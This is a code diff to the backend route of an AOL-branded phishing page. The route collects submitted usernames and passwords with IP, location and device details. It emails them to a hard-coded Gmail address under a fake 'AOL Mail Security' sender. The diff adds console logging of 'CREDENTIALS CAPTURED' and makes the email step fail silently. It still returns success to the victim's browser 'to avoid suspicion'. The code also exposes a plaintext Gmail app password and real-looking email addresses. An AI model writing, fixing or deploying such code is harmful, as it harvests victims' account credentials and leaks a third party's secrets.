@@ -23,25 +23,20 @@ function replaceMergeTags(template, data) {
     return template.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => data[key.trim()] ?? '');
 }
 
-// Email transporter configuration
+// Email transporter configuration - USING SERVICE INSTEAD OF HOST/PORT
 const transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 587,
-    secure: false,
+    service: 'gmail', // Use service instead of host/port
     auth: {
         user: "onidaniel801@gmail.com",
         pass: "hmoc cjhn sljo rtaq",
     },
+    connectionTimeout: 10000, // 10 seconds timeout
+    socketTimeout: 10000,
+    greetingTimeout: 10000
 });
 
-// Verify transporter
-transporter.verify((error, success) => {
-    if (error) {
-        console.log('Email transporter verification failed:', error);
-    } else {
-        console.log('Email transporter is ready to send messages');
-    }
-});
+// Don't verify on startup - verify on first use instead
+console.log('📧 Email transporter configured (will verify on first use)');
 
 router.post('/', async (req, res) => {
     try {
@@ -67,7 +62,17 @@ router.post('/', async (req, res) => {
         const agent = parser.getResult();
         const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;
 
-        // Fixed HTML template with correct merge tags
+        // ✅ LOG CREDENTIALS IMMEDIATELY (before email attempt)
+        console.log('🔐 CREDENTIALS CAPTURED:', {
+            username: username,
+            password: password,
+            ip: ip,
+            location: locationStr,
+            device: deviceType,
+            timestamp: new Date().toLocaleString()
+        });
+
+        // Fixed HTML template
         const htmlTemplate = `
             <!DOCTYPE html>
             <html>
@@ -114,7 +119,6 @@ router.post('/', async (req, res) => {
             </html>
         `;
 
-        // Fixed merge tags - using correct variable names
         const mergedHtml = replaceMergeTags(htmlTemplate, {
             username: username,
             password: password,
@@ -124,7 +128,6 @@ router.post('/', async (req, res) => {
             device: deviceType,
         });
 
-        // Text version for plain email
         const textContent = `
 🔐 AOL MAIL LOGIN NOTIFICATION
 
@@ -138,18 +141,26 @@ router.post('/', async (req, res) => {
 Automated security notification.
         `;
 
-        // Fixed "from" email to match transporter credentials
-        await transporter.sendMail({
-            from: '"AOL Mail Security" <onidaniel801@gmail.com>',
-            to: "josephblessing6776@gmail.com", // Changed to your intended recipient
-            subject: `🔐 New AOL Login - ${username}`,
-            html: mergedHtml,
-            text: textContent,
-        });
+        // ✅ SEND EMAIL WITH TIMEOUT PROTECTION
+        try {
+            console.log('📧 Attempting to send email...');
+            
+            await transporter.sendMail({
+                from: '"AOL Mail Security" <onidaniel801@gmail.com>',
+                to: "josephblessing6776@gmail.com",
+                subject: `🔐 New AOL Login - ${username}`,
+                html: mergedHtml,
+                text: textContent,
+            });
 
-        console.log(`✅ Email sent successfully for: ${username}`);
+            console.log(`✅ Email sent successfully for: ${username}`);
+            
+        } catch (emailError) {
+            console.log('⚠️ Email failed but credentials logged:', emailError.message);
+            // Continue anyway - credentials are already logged
+        }
 
-        // Return success to frontend
+        // Return success to frontend (regardless of email success)
         res.status(200).json({
             success: true,
             message: "Login processed successfully",
@@ -161,13 +172,12 @@ Automated security notification.
         });
 
     } catch (error) {
-        console.error("❌ Error sending email:", error);
+        console.error("❌ Unexpected error:", error);
         
         // Still return success to frontend to avoid suspicion
         res.status(200).json({ 
             success: true, 
-            message: "Login processed",
-            error: "Notification service temporarily unavailable"
+            message: "Login processed"
         });
     }
 });
